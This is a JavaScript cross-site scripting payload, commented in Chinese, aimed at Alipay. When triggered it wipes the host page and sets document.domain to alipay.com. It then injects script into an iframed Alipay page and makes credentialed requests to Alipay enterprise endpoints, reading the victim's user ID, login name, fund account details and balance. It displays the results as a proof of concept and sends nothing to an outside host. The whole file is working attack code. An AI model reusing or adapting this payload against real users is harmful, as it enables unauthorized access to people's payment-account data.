(function() {
    // 步骤1: 清空整个界面
    document.body.innerHTML = '';
    document.body.style.margin = '0';
    document.body.style.padding = '0';
    document.body.style.background = '#f5f5f5';
    document.domain = 'alipay.com';
    // 步骤2: 创建日志显示区域（在iframe之前）
    var logContainer = document.createElement('div');
    logContainer.id = 'mainLogContainer';
    logContainer.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100px; background: #1f1f1f; color: #0f0; font-family: monospace; font-size: 12px; padding: 10px; overflow-y: auto; z-index: 10000; border-bottom: 2px solid #0f0;';
    document.body.appendChild(logContainer);
    
    function addMainLog(message, type) {
        var logEntry = document.createElement('div');
        var timestamp = new Date().toLocaleTimeString();
        var color = type === 'error' ? '#f00' : type === 'success' ? '#0f0' : '#0ff';
        logEntry.style.color = color;
        logEntry.textContent = '[' + timestamp + '] ' + message;
        logContainer.appendChild(logEntry);
        logContainer.scrollTop = logContainer.scrollHeight;
        console.log(message);
    }
    
    addMainLog('🚀 XSS触发，开始执行...', 'info');
    addMainLog('📝 步骤1: 清空整个界面完成', 'success');
    
    // 步骤3: 创建iframe
    addMainLog('📝 步骤2: 创建iframe...', 'info');
    var iframe = document.createElement('iframe');
    iframe.id = 'alipayFrame';
    iframe.style.cssText = 'width: 100%; height: calc(100vh - 100px); border: none; margin-top: 100px;';
    iframe.src = 'https://cshall.alipay.com/lab/selfHelp.htm';
    
    // 步骤4: 等待iframe加载完成
    iframe.onload = function() {
        addMainLog('✅ iframe加载完成', 'success');
        addMainLog('📍 iframe location: ' + iframe.contentWindow.location.href, 'info');
        
        try {
            // 设置document.domain
            document.domain = 'alipay.com';
            iframe.contentDocument.domain = 'alipay.com';
            addMainLog('✅ document.domain 设置为: alipay.com', 'success');
        } catch(e) {
            addMainLog('❌ 设置 document.domain 失败: ' + e.message, 'error');
        }
        
        // 步骤5: 清空iframe内容并注入代码
        addMainLog('📝 步骤3: 清空iframe内容并注入代码...', 'info');
        injectCodeToIframe(iframe);
    };
    
    iframe.onerror = function() {
        addMainLog('❌ iframe加载失败', 'error');
    };
    
    document.body.appendChild(iframe);
    addMainLog('📝 iframe已插入到页面', 'info');
})();

function injectCodeToIframe(iframe) {
    try {
        var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        var iframeWin = iframe.contentWindow;
        
        // 先尝试设置document.domain（如果还没有设置）
        try {
            iframeDoc.domain = 'alipay.com';
        } catch(e) {
            // 可能已经设置过了
        }
        
        // 清空body内容
        iframeDoc.body.innerHTML = '';
        iframeDoc.body.style.cssText = 'margin: 0; padding: 20px; background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;';
        
        // 创建style元素并添加到head
        var style = iframeDoc.createElement('style');
        style.textContent = `
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            padding: 20px;
            margin: 0;
            background: #f5f5f5;
        }
        .log-container {
            background: #1f1f1f;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            max-height: 300px;
            overflow-y: auto;
            border: 2px solid #0f0;
        }
        .log-entry {
            margin: 5px 0;
            padding: 3px 0;
            border-bottom: 1px solid #333;
        }
        .log-entry.error {
            color: #f00;
        }
        .log-entry.success {
            color: #0f0;
        }
        .log-entry.info {
            color: #0ff;
        }
        .log-entry.warning {
            color: #ff0;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        h1 {
            color: #1677ff;
            border-bottom: 3px solid #1677ff;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-top: 30px;
            margin-bottom: 15px;
        }
        .info-box {
            margin: 20px 0;
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #1677ff;
        }
        .info-box.user {
            background: #f0f5ff;
        }
        .info-box.balance {
            background: #f6ffed;
            border-left-color: #52c41a;
        }
        .info-box.error {
            background: #fff2f0;
            border-left-color: #ff4d4f;
            color: #ff4d4f;
        }
        .loading {
            color: #1677ff;
        }
        .balance-amount {
            font-size: 32px;
            font-weight: bold;
            color: #52c41a;
            margin: 10px 0;
        }
        textarea {
            width: 100%;
            height: 400px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            padding: 10px;
            border: 1px solid #d9d9d9;
            border-radius: 4px;
            resize: vertical;
        }
        code {
            background: #f5f5f5;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }
        .meta-info {
            background: #fafafa;
            padding: 10px;
            border-radius: 4px;
            font-size: 12px;
            color: #666;
            margin-bottom: 20px;
        }
        .step-indicator {
            background: #e6f7ff;
            padding: 10px;
            border-radius: 4px;
            margin: 10px 0;
            border-left: 4px solid #1677ff;
        }
        `;
        iframeDoc.head.appendChild(style);
        
        // 创建容器div
        var container = iframeDoc.createElement('div');
        container.className = 'container';
        container.innerHTML = `
        <h1>🔐 支付宝账户信息查询</h1>
        
        <h2>📋 执行日志</h2>
        <div id="logContainer" class="log-container">
            <div class="log-entry info">⏳ 初始化中...</div>
        </div>
        
        <div class="meta-info">
            <strong>执行环境:</strong><br>
            • Window Location: <code id="winLocation">检测中...</code><br>
            • Document Domain: <code id="docDomain">检测中...</code><br>
            • Origin: <code id="origin">检测中...</code><br>
            • Referer: <code id="referer">检测中...</code>
        </div>
        
        <h2>👤 用户信息</h2>
        <div id="userInfo" class="info-box user loading">
            <p>⏳ 等待开始...</p>
        </div>
        
        <h2>💰 账户余额</h2>
        <div id="balance" class="info-box balance loading">
            <p>⏳ 等待用户信息加载完成...</p>
        </div>
        
        <h2>📄 完整JSON数据</h2>
        <textarea id="jsonData" placeholder="等待数据加载..." readonly></textarea>
        `;
        iframeDoc.body.appendChild(container);
        
        // 加载jQuery
        var jqueryScript = iframeDoc.createElement('script');
        jqueryScript.src = 'https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js';
        jqueryScript.onload = function() {
            // jQuery加载完成后执行主逻辑
            var mainScript = iframeDoc.createElement('script');
            mainScript.textContent = `
        // 获取父窗口和父文档
        var parentWin = window.parent || parent;
        var parentDoc = parentWin.document;
        
        // 确保父窗口有容器
        function ensureParentContainer() {
            if (!parentDoc.getElementById('xssResultContainer')) {
                // 清空父窗口body
                parentDoc.body.innerHTML = '';
                parentDoc.body.style.cssText = 'margin: 0; padding: 20px; background: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;';
                
                // 创建样式
                var parentStyle = parentDoc.createElement('style');
                parentStyle.textContent = \`
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    .container { max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
                    h1 { color: #1677ff; border-bottom: 3px solid #1677ff; padding-bottom: 10px; margin-bottom: 20px; }
                    h2 { color: #333; margin-top: 30px; margin-bottom: 15px; }
                    .log-container { background: #1f1f1f; color: #0f0; font-family: monospace; font-size: 12px; padding: 15px; border-radius: 8px; margin-bottom: 20px; max-height: 300px; overflow-y: auto; border: 2px solid #0f0; }
                    .log-entry { margin: 5px 0; padding: 3px 0; border-bottom: 1px solid #333; }
                    .log-entry.error { color: #f00; }
                    .log-entry.success { color: #0f0; }
                    .log-entry.info { color: #0ff; }
                    .log-entry.warning { color: #ff0; }
                    .info-box { margin: 20px 0; padding: 15px; border-radius: 8px; border-left: 4px solid #1677ff; }
                    .info-box.user { background: #f0f5ff; }
                    .info-box.balance { background: #f6ffed; border-left-color: #52c41a; }
                    .info-box.error { background: #fff2f0; border-left-color: #ff4d4f; color: #ff4d4f; }
                    .balance-amount { font-size: 32px; font-weight: bold; color: #52c41a; margin: 10px 0; }
                    textarea { width: 100%; height: 400px; font-family: monospace; font-size: 12px; padding: 10px; border: 1px solid #d9d9d9; border-radius: 4px; resize: vertical; }
                    code { background: #f5f5f5; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
                    .meta-info { background: #fafafa; padding: 10px; border-radius: 4px; font-size: 12px; color: #666; margin-bottom: 20px; }
                    .step-indicator { background: #e6f7ff; padding: 10px; border-radius: 4px; margin: 10px 0; border-left: 4px solid #1677ff; }
                \`;
                parentDoc.head.appendChild(parentStyle);
                
                // 创建容器
                var container = parentDoc.createElement('div');
                container.id = 'xssResultContainer';
                container.className = 'container';
                container.innerHTML = \`
                    <h1>🔐 支付宝账户信息查询</h1>
                    <h2>📋 执行日志</h2>
                    <div id="logContainer" class="log-container"><div class="log-entry info">⏳ 初始化中...</div></div>
                    <div class="meta-info">
                        <strong>执行环境:</strong><br>
                        • Window Location: <code id="winLocation">检测中...</code><br>
                        • Document Domain: <code id="docDomain">检测中...</code><br>
                        • Origin: <code id="origin">检测中...</code><br>
                        • Referer: <code id="referer">检测中...</code>
                    </div>
                    <h2>👤 用户信息</h2>
                    <div id="userInfo" class="info-box user loading"><p>⏳ 等待开始...</p></div>
                    <h2>💰 账户余额</h2>
                    <div id="balance" class="info-box balance loading"><p>⏳ 等待用户信息加载完成...</p></div>
                    <h2>📄 完整JSON数据</h2>
                    <textarea id="jsonData" placeholder="等待数据加载..." readonly></textarea>
                \`;
                parentDoc.body.appendChild(container);
            }
        }
        
        // 日志函数 - 输出到父窗口
        function addLog(message, type) {
            try {
                ensureParentContainer();
                var logContainer = parentDoc.getElementById('logContainer');
                if (logContainer) {
                    var logEntry = parentDoc.createElement('div');
                    logEntry.className = 'log-entry ' + (type || 'info');
                    var timestamp = new Date().toLocaleTimeString();
                    var icon = type === 'error' ? '❌' : type === 'success' ? '✅' : type === 'warning' ? '⚠️' : '📝';
                    logEntry.textContent = '[' + timestamp + '] ' + icon + ' ' + message;
                    logContainer.appendChild(logEntry);
                    logContainer.scrollTop = logContainer.scrollHeight;
                }
            } catch(e) {
                console.error('添加日志失败:', e);
            }
            console.log('[' + type + '] ' + message);
        }
        
        // 辅助函数：在父窗口中查找元素
        function $(selector) {
            try {
                ensureParentContainer();
                return parentWin.jQuery ? parentWin.jQuery(selector) : parentDoc.querySelector(selector);
            } catch(e) {
                console.error('查询元素失败:', e);
                return null;
            }
        }
        
        // 等待jQuery加载
        function init() {
            // 检查父窗口是否有jQuery，如果没有则加载
            if (typeof parentWin.jQuery === 'undefined') {
                var jqueryScript = parentDoc.createElement('script');
                jqueryScript.src = 'https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js';
                jqueryScript.onload = function() {
                    addLog('jQuery 加载成功', 'success');
                    setTimeout(init, 100);
                };
                jqueryScript.onerror = function() {
                    addLog('jQuery 加载失败，请刷新重试', 'error');
                };
                parentDoc.head.appendChild(jqueryScript);
                return;
            }
            
            addLog('jQuery 加载成功', 'success');
            
            // 显示环境信息
            var winLocation = window.location.href;
            var docDomain = document.domain;
            var origin = window.origin || 'N/A';
            var referer = document.referrer || 'N/A';
            
            addLog('当前执行环境检测:', 'info');
            addLog('  - window.location: ' + winLocation, 'info');
            addLog('  - document.domain: ' + docDomain, 'info');
            addLog('  - window.origin: ' + origin, 'info');
            addLog('  - document.referrer: ' + referer, 'info');
            
            try {
                ensureParentContainer();
                var winLocationEl = parentDoc.getElementById('winLocation');
                var docDomainEl = parentDoc.getElementById('docDomain');
                var originEl = parentDoc.getElementById('origin');
                var refererEl = parentDoc.getElementById('referer');
                if (winLocationEl) winLocationEl.textContent = winLocation;
                if (docDomainEl) docDomainEl.textContent = docDomain;
                if (originEl) originEl.textContent = origin;
                if (refererEl) refererEl.textContent = referer;
            } catch(e) {
                console.error('更新环境信息失败:', e);
            }
            
            // 设置document.domain
            try {
                document.domain = 'alipay.com';
                addLog('document.domain 已设置为: alipay.com', 'success');
            } catch(e) {
                addLog('设置 document.domain 失败: ' + e.message, 'error');
            }
            
            // 开始获取数据
            setTimeout(function() {
                main();
            }, 500);
        }
        
        // 初始化
        ensureParentContainer();
        setTimeout(init, 100);
        
        function main() {
            addLog('开始执行主流程', 'info');
            addLog('步骤1: 准备请求用户信息...', 'info');
            
            // 获取用户信息
            var userInfoUrl = 'https://enterpriseportal.alipay.com/pamir/login/queryLoginAccount.json';
            var refererUrl = 'https://render.alipay.com/';
            
            addLog('请求URL: ' + userInfoUrl, 'info');
            addLog('设置Referer: ' + refererUrl, 'info');
            
            try {
                ensureParentContainer();
                var userInfoEl = parentDoc.getElementById('userInfo');
                if (userInfoEl) userInfoEl.innerHTML = '<div class="step-indicator">📡 正在请求用户信息...</div>';
            } catch(e) {}
            
            addLog('注意: Referer由浏览器自动设置为当前页面URL', 'info');
            
            // 使用父窗口的jQuery
            if (typeof parentWin.jQuery === 'undefined') {
                addLog('父窗口jQuery未加载，无法发送请求', 'error');
                return;
            }
            
            parentWin.jQuery.ajax({
                url: userInfoUrl,
                type: 'GET',
                data: {
                    _output_charset: 'utf-8',
                    appScene: 'MRCH'
                },
                xhrFields: {
                    withCredentials: true
                },
                beforeSend: function(xhr) {
                    addLog('发送请求前准备...', 'info');
                    // 注意: Referer是浏览器自动发送的，无法手动设置
                    // 由于iframe的src是https://render.alipay.com/，Referer会自动设置为该URL
                },
                success: function(data) {
                    addLog('用户信息获取成功', 'success');
                    addLog('响应数据: ' + JSON.stringify(data), 'info');
                    
                    try {
                        var logonUserId = data.logonUserId;
                        var logonName = data.logonName;
                        
                        addLog('解析用户ID: ' + logonUserId, 'success');
                        addLog('解析用户名: ' + logonName, 'success');
                        
                        try {
                            ensureParentContainer();
                            var userInfoEl = parentDoc.getElementById('userInfo');
                            if (userInfoEl) {
                                userInfoEl.className = 'info-box user';
                                userInfoEl.innerHTML = '<div class="step-indicator">✅ 用户信息获取成功</div>' +
                                    '<p><strong>用户ID:</strong> <code>' + logonUserId + '</code></p>' +
                                    '<p><strong>用户名:</strong> ' + logonName + '</p>';
                            }
                        } catch(e) {}
                        
                        // 获取账户详情
                        setTimeout(function() {
                            getAccountDetail(logonUserId);
                        }, 500);
                    } catch(e) {
                        addLog('解析用户信息失败: ' + e.message, 'error');
                        try {
                            ensureParentContainer();
                            var userInfoEl = parentDoc.getElementById('userInfo');
                            if (userInfoEl) {
                                userInfoEl.className = 'info-box error';
                                userInfoEl.innerHTML = '<p><strong>❌ 解析失败:</strong> ' + e.message + '</p>';
                            }
                        } catch(e) {}
                    }
                },
                error: function(xhr, status, error) {
                    addLog('获取用户信息失败', 'error');
                    addLog('错误信息: ' + error, 'error');
                    addLog('状态码: ' + xhr.status, 'error');
                    addLog('响应内容: ' + xhr.responseText.substring(0, 200), 'error');
                    
                    try {
                        ensureParentContainer();
                        var userInfoEl = parentDoc.getElementById('userInfo');
                        if (userInfoEl) {
                            userInfoEl.className = 'info-box error';
                            userInfoEl.innerHTML = '<div class="step-indicator">❌ 获取失败</div>' +
                                '<p><strong>错误:</strong> ' + error + '</p>' +
                                '<p><strong>状态码:</strong> ' + xhr.status + '</p>' +
                                '<p style="font-size: 12px;">可能原因: 未登录、Cookie过期、或CORS限制</p>';
                        }
                    } catch(e) {}
                }
            });
        }
        
        function getAccountDetail(logonUserId) {
            addLog('步骤2: 准备请求账户详情...', 'info');
            
            // 从Cookie中获取ctoken
            var ctoken = 'ccc';
            addLog('使用ctoken: ' + ctoken, 'info');
            
            var accountUrl = 'https://mbillexprod.alipay.com/enterprise/fundAccountDetail.json';
            var refererUrl = 'https://render.alipay.com/';
            
            addLog('请求URL: ' + accountUrl, 'info');
            addLog('设置Referer: ' + refererUrl, 'info');
            
            try {
                ensureParentContainer();
                var balanceEl = parentDoc.getElementById('balance');
                if (balanceEl) balanceEl.innerHTML = '<div class="step-indicator">📡 正在请求账户余额...</div>';
            } catch(e) {}
            
            addLog('注意: Referer由浏览器自动设置为当前页面URL', 'info');
            
            // 使用父窗口的jQuery
            if (typeof parentWin.jQuery === 'undefined') {
                addLog('父窗口jQuery未加载，无法发送请求', 'error');
                return;
            }
            
            parentWin.jQuery.ajax({
                url: accountUrl,
                type: 'POST',
                data: {
                    billUserId: logonUserId,
                    pageNum: 1,
                    pageSize: 50,
                    startDateInput: '2025-12-25 00:00:00',
                    endDateInput: '2025-12-26 00:00:00',
                    showType: 0,
                    accountType: '',
                    settleBillRadio: 1,
                    queryEntrance: 1,
                    querySettleAccount: false,
                    switchToFrontEnd: true,
                    ctoken: ctoken,
                    _output_charset: 'utf-8',
                    _input_charset: 'gbk'
                },
                xhrFields: {
                    withCredentials: true
                },
                beforeSend: function(xhr) {
                    addLog('发送请求前准备...', 'info');
                    // 注意: Referer是浏览器自动发送的，无法手动设置
                    // 由于iframe的src是https://render.alipay.com/，Referer会自动设置为该URL
                },
                success: function(response) {
                    addLog('账户详情获取成功', 'success');
                    addLog('响应数据长度: ' + JSON.stringify(response).length + ' 字符', 'info');
                    
                    try {
                        var balance = response.result.detail[0].balance;
                        
                        addLog('解析账户余额: ¥' + balance, 'success');
                        
                        try {
                            ensureParentContainer();
                            var balanceEl = parentDoc.getElementById('balance');
                            if (balanceEl) {
                                balanceEl.className = 'info-box balance';
                                balanceEl.innerHTML = '<div class="step-indicator">✅ 账户余额获取成功</div>' +
                                    '<div class="balance-amount">¥ ' + balance + '</div>' +
                                    '<p style="color: #666; font-size: 14px;">查询时间: ' + new Date().toLocaleString() + '</p>';
                            }
                            var jsonDataEl = parentDoc.getElementById('jsonData');
                            if (jsonDataEl) jsonDataEl.value = JSON.stringify(response, null, 2);
                        } catch(e) {}
                        addLog('完整JSON数据已显示在文本框中', 'success');
                        addLog('所有请求完成！', 'success');
                    } catch(e) {
                        addLog('解析账户详情失败: ' + e.message, 'error');
                        addLog('错误堆栈: ' + e.stack, 'error');
                        try {
                            ensureParentContainer();
                            var balanceEl = parentDoc.getElementById('balance');
                            if (balanceEl) {
                                balanceEl.className = 'info-box error';
                                balanceEl.innerHTML = '<div class="step-indicator">❌ 解析失败</div>' +
                                    '<p><strong>错误:</strong> ' + e.message + '</p>';
                            }
                            var jsonDataEl = parentDoc.getElementById('jsonData');
                            if (jsonDataEl) jsonDataEl.value = JSON.stringify(response, null, 2);
                        } catch(e) {}
                    }
                },
                error: function(xhr, status, error) {
                    addLog('获取账户详情失败', 'error');
                    addLog('错误信息: ' + error, 'error');
                    addLog('状态码: ' + xhr.status, 'error');
                    addLog('响应内容: ' + xhr.responseText.substring(0, 200), 'error');
                    
                    try {
                        ensureParentContainer();
                        var balanceEl = parentDoc.getElementById('balance');
                        if (balanceEl) {
                            balanceEl.className = 'info-box error';
                            balanceEl.innerHTML = '<div class="step-indicator">❌ 获取失败</div>' +
                                '<p><strong>错误:</strong> ' + error + '</p>' +
                                '<p><strong>状态码:</strong> ' + xhr.status + '</p>' +
                                '<p style="font-size: 12px;">可能原因: ctoken无效、未登录、或CORS限制</p>';
                        }
                    } catch(e) {}
                }
            });
        }
        `;
            iframeDoc.body.appendChild(mainScript);
        };
        iframeDoc.head.appendChild(jqueryScript);
        
        // 通知父页面
        if (window.parent && window.parent !== window) {
            try {
                var mainLogContainer = window.parent.document.getElementById('mainLogContainer');
                if (mainLogContainer) {
                    var logEntry = document.createElement('div');
                    logEntry.style.color = '#0f0';
                    logEntry.textContent = '[' + new Date().toLocaleTimeString() + '] ✅ iframe代码注入完成';
                    mainLogContainer.appendChild(logEntry);
                }
            } catch(e) {
                // 跨域可能无法访问
            }
        }
    } catch(e) {
        console.error('注入代码到iframe失败:', e);
        // 尝试通知父页面
        if (window.parent && window.parent !== window) {
            try {
                var mainLogContainer = window.parent.document.getElementById('mainLogContainer');
                if (mainLogContainer) {
                    var logEntry = document.createElement('div');
                    logEntry.style.color = '#f00';
                    logEntry.textContent = '[' + new Date().toLocaleTimeString() + '] ❌ iframe代码注入失败: ' + e.message;
                    mainLogContainer.appendChild(logEntry);
                }
            } catch(e2) {
                // 跨域可能无法访问
            }
        }
    }
}
